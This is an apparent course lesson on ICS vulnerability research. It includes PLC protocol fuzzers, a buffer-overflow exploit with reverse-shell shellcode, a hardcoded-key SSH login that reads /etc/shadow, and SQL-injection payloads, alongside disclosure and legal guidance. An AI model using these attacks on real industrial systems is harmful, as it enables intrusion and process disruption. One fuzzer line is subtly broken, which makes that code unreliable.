Lesson 08: Vulnerability Research &
Exploit Dev

Lesson 08: ICS Vulnerability Research &
Exploit Development
Learning Objectives
●​
●​
●​
●​
●​

Conduct vulnerability research on PLCs and ICS devices
Perform protocol fuzzing for industrial protocols (Modbus, S7comm, DNP3)
Develop proof-of-concept exploits for ICS vulnerabilities
Understand memory corruption vulnerabilities in embedded systems
Follow responsible disclosure processes for ICS vulnerabilities

1. ICS Vulnerability Landscape
1.1 Common ICS Vulnerability Classes
Vulnerability Type

Prevalence

Impact

Example CVE

Authentication Bypass

Very High

Critical

CVE-2022-2003 (Siemens
SCALANCE)

Hardcoded Credentials

High

Critical

CVE-2019-6575 (Matrikon OPC)

Buffer Overflow

Medium

Critical

CVE-2020-12020 (Schneider
Electric)

Command Injection

Medium

Critical

CVE-2021-22681 (Rockwell)

Path Traversal

High

High

CVE-2020-7010 (GE Digital)

SQL Injection

Medium

High

CVE-2019-13544 (Schneider HMI)

Insecure Protocol

Very High

Medium

N/A (Modbus, DNP3 design flaws)

Denial of Service

High

High

CVE-2015-5374 (Allen-Bradley)

Firmware Downgrade

Low

Critical

CVE-2018-7830 (Siemens S7-1500)

1.2 ICS CVE Examples Analysis
CVE-2019-6575: Matrikon OPC Authentication Bypass:

●​
●​
●​
●​
●​
●​

Vendor: Matrikon (Honeywell)
Product: OPC UA Tunneller
Vulnerability: Hardcoded SSH key allows unauthorized access
Impact: Remote code execution as SYSTEM
CVSS: 10.0 (Critical)
Fix: Firmware update to remove hardcoded keys

CVE-2020-15368: Siemens S7-1500 DoS:
●​
●​
●​
●​
●​
●​

Vendor: Siemens
Product: S7-1500 CPUs
Vulnerability: Malformed S7comm packet causes CPU fault
Impact: PLC enters STOP mode (process shutdown)
CVSS: 7.5 (High)
Exploit: Send crafted S7comm ROSCTR byte sequence

CVE-2021-33977: Schneider Electric Modicon Memory Corruption:
●​
●​
●​
●​
●​
●​

Vendor: Schneider Electric
Product: Modicon M340, M580 PLCs
Vulnerability: Buffer overflow in web server
Impact: Remote code execution, DoS
CVSS: 9.8 (Critical)
Attack Vector: HTTP POST to /config endpoint with oversized data

1.3 ICS-CERT Advisories
Monitoring ICS-CERT:
# RSS feed for ICS-CERT advisories
curl https://us-cert.cisa.gov/ics/advisories/advisories.xml
# Filter by vendor (e.g., Siemens)
curl -s https://us-cert.cisa.gov/ics/advisories/advisories.xml | grep -i "siemens" -A 5
# Subscribe to email alerts
# Visit: https://us-cert.cisa.gov/mailing-lists-and-feeds
Parsing ICS-CERT JSON:
import requests
import json
def get_ics_cert_advisories():
url = "https://www.cisa.gov/sites/default/files/feeds/advisories.json"
response = requests.get(url)
advisories = response.json()
for advisory in advisories:

print(f"ID: {advisory['id']}")
print(f"Title: {advisory['title']}")
print(f"Published: {advisory['published']}")
print(f"CVSS: {advisory.get('cvss', 'N/A')}")
print("---")
get_ics_cert_advisories()

2. Protocol Fuzzing
2.1 Fuzzing Fundamentals
Fuzzing: Automated testing with malformed/unexpected inputs to discover crashes, hangs,
or unexpected behavior
Fuzzing Strategies:
1.​ Dumb Fuzzing: Random byte manipulation
2.​ Mutation-Based: Modify known-good inputs
3.​ Generation-Based: Create inputs from protocol specification
4.​ Stateful Fuzzing: Maintain protocol state machine

2.2 Modbus Fuzzer Development
Simple Modbus Fuzzer (mutation-based):
#!/usr/bin/env python3
import socket
import struct
import random
import time
class ModbusFuzzer:
def __init__(self, target_ip, port=502):
self.target_ip = target_ip
self.port = port
self.iteration = 0
self.crashes = []
def generate_fuzzed_packet(self):
"""
Generate fuzzed Modbus packet
"""
strategies = [
self.fuzz_header,
self.fuzz_function_code,
self.fuzz_data_length,

self.fuzz_random_bytes,
self.fuzz_valid_packet_mutated
]
fuzzer = random.choice(strategies)
return fuzzer()
def fuzz_header(self):
"""
Fuzz MBAP header fields
"""
trans_id = struct.pack('>H', random.randint(0, 65535))
proto_id = struct.pack('>H', random.randint(0, 65535)) # Should be 0x0000
length = struct.pack('>H', random.randint(0, 500))
unit_id = bytes([random.randint(0, 255)])
func_code = bytes([random.randint(0, 255)])
data = bytes([random.randint(0, 255) for _ in range(random.randint(0, 250))])
return trans_id + proto_id + length + unit_id + func_code + data
def fuzz_function_code(self):
"""
Send invalid/reserved function codes
"""
trans_id = b'\x00\x01'
proto_id = b'\x00\x00'
unit_id = b'\x01'
# Reserved/invalid function codes
invalid_fcs = [0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x18, 0x80-0xFF]
func_code = bytes([random.choice(invalid_fcs)])
data = bytes([random.randint(0, 255) for _ in range(random.randint(0, 10))])
length = struct.pack('>H', len(unit_id + func_code + data))
return trans_id + proto_id + length + unit_id + func_code + data
def fuzz_data_length(self):
"""
Send mismatched length fields
"""
trans_id = b'\x00\x01'
proto_id = b'\x00\x00'
unit_id = b'\x01'
func_code = b'\x03' # Read Holding Registers
# Create large data buffer
data = bytes([0x00] * random.randint(300, 5000))

# Incorrect length field
length = struct.pack('>H', random.randint(0, 100))
return trans_id + proto_id + length + unit_id + func_code + data
def fuzz_random_bytes(self):
"""
Completely random packet
"""
return bytes([random.randint(0, 255) for _ in range(random.randint(1, 500))])
def fuzz_valid_packet_mutated(self):
"""
Start with valid packet, mutate bytes
"""
# Valid Read Holding Registers request
packet = bytearray(b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x0A')
# Mutate 1-3 bytes
for _ in range(random.randint(1, 3)):
pos = random.randint(0, len(packet) - 1)
packet[pos] = random.randint(0, 255)
return bytes(packet)
def send_packet(self, packet):
"""
Send fuzzed packet and check for crash
"""
try:
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(2)
sock.connect((self.target_ip, self.port))
sock.send(packet)
response = sock.recv(1024)
sock.close()
return True, response
except socket.timeout:
print(f"[!] Iteration {self.iteration}: Timeout (possible hang)")
return False, None
except ConnectionRefusedError:
print(f"[!] Iteration {self.iteration}: Connection refused (possible crash)")
self.crashes.append({

'iteration': self.iteration,
'packet': packet.hex(),
'error': 'Connection Refused'
})
return False, None
except Exception as e:
print(f"[!] Iteration {self.iteration}: {e}")
return False, None
def run(self, iterations=1000):
"""
Run fuzzing campaign
"""
print(f"[*] Starting Modbus fuzzer against {self.target_ip}:{self.port}")
print(f"[*] Iterations: {iterations}")
for i in range(iterations):
self.iteration = i
packet = self.generate_fuzzed_packet()
success, response = self.send_packet(packet)
if success:
print(f"[{i}] Sent {len(packet)} bytes, received {len(response)} bytes")
else:
# Wait for device to recover
time.sleep(5)
# Rate limiting
time.sleep(0.1)
print(f"\n[*] Fuzzing complete")
print(f"[*] Potential crashes: {len(self.crashes)}")
# Save crash logs
if self.crashes:
with open("modbus_crashes.log", "w") as f:
for crash in self.crashes:
f.write(f"Iteration: {crash['iteration']}\n")
f.write(f"Packet: {crash['packet']}\n")
f.write(f"Error: {crash['error']}\n\n")
# Usage
# fuzzer = ModbusFuzzer('192.168.1.100')
# fuzzer.run(iterations=1000)

2.3 AFL (American Fuzzy Lop) for ICS Protocols
AFL Setup for Protocol Fuzzing:
# Install AFL++
git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus
make
sudo make install
# Create target program (Modbus parser)
cat > modbus_parser.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void parse_modbus(unsigned char *data, size_t len) {
if (len < 8) return;
unsigned short trans_id = (data[0] << 8) | data[1];
unsigned short proto_id = (data[2] << 8) | data[3];
unsigned short length = (data[4] << 8) | data[5];
unsigned char unit_id = data[6];
unsigned char func_code = data[7];
printf("Trans ID: 0x%04X\n", trans_id);
printf("Function Code: 0x%02X\n", func_code);
// Vulnerable code (buffer overflow)
if (func_code == 0x03) { // Read Holding Registers
unsigned short start_addr = (data[8] << 8) | data[9];
unsigned short count = (data[10] << 8) | data[11];
char buffer[64];
if (count > 100) { // Intentional vulnerability
memcpy(buffer, data, count); // Overflow!
}
}
}
int main(int argc, char **argv) {
if (argc < 2) {
printf("Usage: %s <input_file>\n", argv[0]);
return 1;
}
FILE *fp = fopen(argv[1], "rb");
if (!fp) return 1;

unsigned char buffer[1024];
size_t len = fread(buffer, 1, sizeof(buffer), fp);
fclose(fp);
parse_modbus(buffer, len);
return 0;
}
EOF
# Compile with AFL instrumentation
afl-gcc -o modbus_parser modbus_parser.c
# Create seed inputs (valid Modbus packets)
mkdir -p afl_in afl_out
echo -ne '\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x0A' > afl_in/valid1.bin
# Run AFL fuzzer
afl-fuzz -i afl_in -o afl_out -- ./modbus_parser @@
# Monitor crashes in afl_out/crashes/

2.4 Stateful Protocol Fuzzing (Sulley/Boofuzz)
Boofuzz for S7comm:
from boofuzz import *
def main():
# Define S7comm protocol
s_initialize("s7comm_cotp_cr")
# TPKT Header
s_static("\x03\x00") # Version, Reserved
s_size("tpkt_length", offset=0, length=2, endian=">", fuzzable=False)
if s_block_start("tpkt_length"):
# COTP Connection Request
s_byte(0x11, name="cotp_length", fuzzable=True)
s_byte(0xE0, name="cotp_pdu_type", fuzzable=True) # CR
s_word(0x0000, name="dest_ref", endian=">", fuzzable=True)
s_word(0x0001, name="src_ref", endian=">", fuzzable=True)
s_byte(0x00, name="class_option", fuzzable=True)
# Parameters
s_byte(0xC1, name="param1", fuzzable=True)
s_byte(0x02, name="param1_len", fuzzable=False)
s_word(0x0100, name="tpdu_size", endian=">", fuzzable=True)

s_block_end("tpkt_length")
# Setup session
session = Session(target=Target(connection=SocketConnection("192.168.1.100", 102,
proto="tcp")))
session.connect(s_get("s7comm_cotp_cr"))
# Fuzz!
session.fuzz()
if __name__ == "__main__":
main()

3. Exploit Development for ICS Devices
3.1 Buffer Overflow in PLC Web Server
Scenario: Schneider Electric Modicon PLC with vulnerable web interface
Vulnerability: Buffer overflow in HTTP POST parameter
Exploit Development Process:
Step 1: Crash Discovery:
import requests
def crash_test():
target = "http://192.168.1.100/config"
for size in range(100, 5000, 100):
payload = "A" * size
data = {"config_name": payload}
try:
response = requests.post(target, data=data, timeout=5)
print(f"[+] Size {size}: {response.status_code}")
except:
print(f"[!] Crash at size {size}")
break
crash_test()
Step 2: Offset Identification (pattern_create.rb from Metasploit):
# Generate unique pattern

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000 > pattern.txt
# Send pattern, observe crash
# Use debugger (if available) to find EIP/PC overwrite offset
# Calculate offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <value_in_register>
Step 3: Proof-of-Concept Exploit:
import requests
import struct
def exploit_modicon_bof():
target = "http://192.168.1.100/config"
# Offset to return address: 512 bytes (example)
offset = 512
# Shellcode (reverse shell, ARM architecture for embedded PLC)
# msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f
python
shellcode = (
b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\xc8\x27"
b"\x51\x37\x01\xdf\x04\x1c\x0a\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf"
# ... (truncated for brevity)
)
# Return address (adjust based on memory layout)
# Point to NOP sled or shellcode location
ret_addr = struct.pack("<I", 0xBEEFF00D) # Example address
# NOP sled (for alignment)
nop_sled = b"\x00\x00\xa0\xe1" * 20 # ARM NOP
# Construct payload
payload = b"A" * offset + ret_addr + nop_sled + shellcode
data = {"config_name": payload}
print("[*] Sending exploit...")
try:
response = requests.post(target, data=data, timeout=5)
print(f"[+] Response: {response.status_code}")
except:
print("[+] Payload sent, check reverse shell listener")
# Listener:

# nc -lvnp 4444
# exploit_modicon_bof()

3.2 Authentication Bypass Exploit
Scenario: CVE-2019-6575 (Matrikon OPC hardcoded SSH key)
Exploit:
import paramiko
def exploit_matrikon_hardcoded_key():
"""
Exploit hardcoded SSH private key in Matrikon OPC Tunneller
CVE-2019-6575
"""
target = "192.168.1.100"
port = 22
username = "support" # Hardcoded username
# Hardcoded private key (extracted from firmware)
private_key_str = """-----BEGIN RSA PRIVATE KEY----MIIEpAIBAAKCAQEA... # Truncated
-----END RSA PRIVATE KEY-----"""
from io import StringIO
private_key = paramiko.RSAKey.from_private_key(StringIO(private_key_str))
# Connect
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
client.connect(target, port=port, username=username, pkey=private_key)
print("[+] Authentication successful!")
# Execute command
stdin, stdout, stderr = client.exec_command("cat /etc/shadow")
print(stdout.read().decode())
client.close()
except Exception as e:
print(f"[-] Exploit failed: {e}")
# exploit_matrikon_hardcoded_key()

3.3 Command Injection in HMI
Scenario: SQL injection in Wonderware HMI historian query
Vulnerable Code (hypothetical):
SELECT * FROM tags WHERE tag_name = '$user_input';
Exploit:
import requests
def exploit_hmi_sqli():
target = "http://192.168.1.100/historian/query"
# SQL injection payload
# Extract database credentials
payload = "' UNION SELECT username, password FROM users-- "
params = {"tag": payload}
response = requests.get(target, params=params)
print(response.text)
# If vulnerable, response contains username/password hashes
# Advanced: Time-based blind SQLi
def blind_sqli(target):
result = ""
for i in range(1, 20): # Extract 20 characters
for char in range(32, 127): # ASCII printable
payload = f"' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT
1),{i},1))={char}, SLEEP(3), 0)-- "
params = {"tag": payload}
import time
start = time.time()
requests.get(target, params=params, timeout=5)
elapsed = time.time() - start
if elapsed >= 3:
result += chr(char)
print(f"[+] Found character: {chr(char)} (Position {i})")
break
print(f"[+] Extracted password: {result}")

4. Memory Corruption in Embedded Systems
4.1 Firmware Analysis
Extract Firmware:
# Download firmware from vendor site or extract from device
# Identify file type
file firmware.bin
# Extract filesystem (if compressed/packed)
binwalk -e firmware.bin
# Alternative: use firmware-mod-kit
git clone https://github.com/rampageX/firmware-mod-kit
cd firmware-mod-kit/src
./configure && make
../extract-firmware.sh /path/to/firmware.bin
Analyze Extracted Filesystem:
cd _firmware.bin.extracted/squashfs-root
# Find SUID binaries
find . -perm -4000 -type f
# Find hardcoded credentials
grep -r "password" .
grep -r "admin" .
# Find web server binaries
find . -name "*httpd*" -o -name "*lighttpd*"
# Analyze web server binary for vulnerabilities
file ./usr/sbin/httpd
strings ./usr/sbin/httpd | grep -E "POST|GET|admin"
Reverse Engineer Binary:
# Use Ghidra for ARM/MIPS binaries (common in PLCs)
ghidra
# Load binary, analyze
# Look for:
# - strcpy, sprintf (buffer overflow)
# - system(), popen() (command injection)

# - Hardcoded strings (credentials, IPs)

4.2 Heap Overflow Example
Vulnerable Code (hypothetical PLC firmware):
// Simplified PLC HTTP server
void handle_post(char *post_data, size_t len) {
char *buffer = malloc(256);
// Vulnerability: No length check
strcpy(buffer, post_data); // Heap overflow!
process_config(buffer);
free(buffer);
}
Heap Exploit:
●​
●​
●​
●​

Overflow buffer to overwrite heap metadata
Corrupt adjacent heap chunks
Hijack function pointers or vtables
Achieve code execution

5. Responsible Disclosure
5.1 Coordinated Vulnerability Disclosure (CVD)
Process:
1.​ Discovery: Identify vulnerability in ICS product
2.​ Verification: Confirm vulnerability in lab environment (not production!)
3.​ Documentation: Write detailed report with PoC
4.​ Vendor Contact: Notify vendor via security contact (not public disclosure)
5.​ Embargo Period: Give vendor 90-180 days to patch (longer for ICS due to testing)
6.​ Patch Release: Vendor releases fix
7.​ Public Disclosure: Publish advisory with CVE

5.2 Reporting to ICS-CERT
CISA ICS-CERT Reporting:
●​ Email: ics-cert@cisa.dhs.gov
●​ Web Form: https://www.cisa.gov/report
●​ PGP Key: Available for encrypted submission
Report Template:

Subject: Vulnerability Disclosure - [Vendor] [Product] [Vulnerability Type]
Dear ICS-CERT Team,
I am reporting a security vulnerability in:
- Vendor: [Vendor Name]
- Product: [Product Name and Version]
- Component: [Affected Component]
Vulnerability Details:
- Type: [Buffer Overflow / Auth Bypass / etc.]
- Impact: [Remote Code Execution / DoS / etc.]
- CVSS Score: [Estimated Score]
Technical Description:
[Detailed explanation of vulnerability]
Proof of Concept:
[Code or steps to reproduce]
Affected Versions:
[List of affected firmware/software versions]
Mitigation:
[Temporary workarounds if any]
Timeline:
- Discovery Date: [Date]
- Vendor Notification: [Date or "Not yet contacted"]
I am available for further discussion and coordination.
Regards,
[Your Name]
[Contact Information]

5.3 Bug Bounty Programs
ICS Vendors with Bug Bounties:
●​ Siemens:
https://new.siemens.com/global/en/products/services/cert/coordinated-disclosure.htm
l
●​ Schneider Electric:
https://www.se.com/ww/en/about-us/cybersecurity/report-vulnerability.jsp
●​ Rockwell Automation:
https://www.rockwellautomation.com/en-us/support/product-security.html
●​ General Electric: https://www.ge.com/digital/security

●​ ABB: https://global.abb/group/en/technology/cyber-security/report-vulnerability
Disclosure Guidelines:
●​
●​
●​
●​

Do NOT test on production systems
Do NOT publish 0-day exploits before vendor patch
Follow vendor's disclosure timeline (typically 90-180 days)
Coordinate with ICS-CERT for critical infrastructure

6. Legal and Ethical Considerations
6.1 Computer Fraud and Abuse Act (CFAA)
CFAA Prohibitions (18 U.S.C. § 1030):
●​ Unauthorized access to protected computers
●​ Exceeding authorized access
●​ Causing damage to computers
ICS Context:
●​ Testing on production ICS without authorization is ILLEGAL
●​ Build lab environments for research
●​ Obtain written authorization for penetration testing

6.2 Safe Harbor Provisions
Good Faith Research:
●​ Vendor security policies often provide safe harbor
●​ Coordinate with vendor before testing
●​ Follow disclosure guidelines
Example: Siemens ProductCERT:
●​ Welcomes security research
●​ Provides secure communication channel
●​ Commits to coordinated disclosure

7. Hands-On Lab Exercises
Lab 1: Protocol Fuzzing
1.​ Set up OpenPLC as Modbus server
2.​ Implement basic Modbus fuzzer (from section 2.2)
3.​ Run fuzzer, monitor for crashes or hangs
4.​ Document any unusual responses
5.​ Analyze logs to identify potential vulnerabilities

Lab 2: AFL Fuzzing
1.​ Install AFL++
2.​ Create simple protocol parser (Modbus, DNP3, or S7comm)
3.​ Compile with AFL instrumentation
4.​ Create seed corpus of valid protocol packets
5.​ Run AFL fuzzer for 1 hour, analyze crashes

Lab 3: Firmware Analysis
1.​ Download open-source PLC firmware (or use OpenPLC)
2.​ Extract filesystem with binwalk
3.​ Analyze binaries with Ghidra
4.​ Identify hardcoded credentials or suspicious functions
5.​ Document findings

Lab 4: Responsible Disclosure Practice
1.​ Simulate discovering a vulnerability (use intentional vuln in lab)
2.​ Write detailed vulnerability report
3.​ Draft vendor notification email
4.​ Create CVE request template
5.​ Develop patch recommendation

8. Tools & Resources
Fuzzing Tools
●​ AFL++: https://github.com/AFLplusplus/AFLplusplus
●​ Boofuzz: https://github.com/jtpereyda/boofuzz
●​ Peach Fuzzer: https://peachtech.gitlab.io/peach-fuzzer-community/

Firmware Analysis
●​ Binwalk: https://github.com/ReFirmLabs/binwalk
●​ Ghidra: https://ghidra-sre.org/
●​ Firmware Analysis Toolkit: https://github.com/attify/firmware-analysis-toolkit

Disclosure
●​ CISA ICS-CERT: https://www.cisa.gov/ics
●​ CVE Request: https://cveform.mitre.org/
●​ HackerOne: https://www.hackerone.com/ (for vendors with programs)

Legal Resources
●​ CFAA Text: https://www.law.cornell.edu/uscode/text/18/1030

●​ DOJ CFAA Guidance:
https://www.justice.gov/criminal-ccips/ccips-documents-and-reports

9. Knowledge Check
1.​ What are the most common vulnerability classes in ICS devices?
2.​ Describe the difference between mutation-based and generation-based fuzzing.
3.​ How would you develop a fuzzer for the Modbus protocol?
4.​ What is the purpose of AFL (American Fuzzy Lop)?
5.​ Explain the buffer overflow exploit development process.
6.​ What are the ethical considerations for ICS vulnerability research?
7.​ Describe the coordinated vulnerability disclosure (CVD) process.
8.​ What is the typical disclosure timeline for ICS vulnerabilities?
9.​ How do you extract and analyze firmware from an embedded device?
10.​Why is testing on production ICS systems illegal and dangerous?

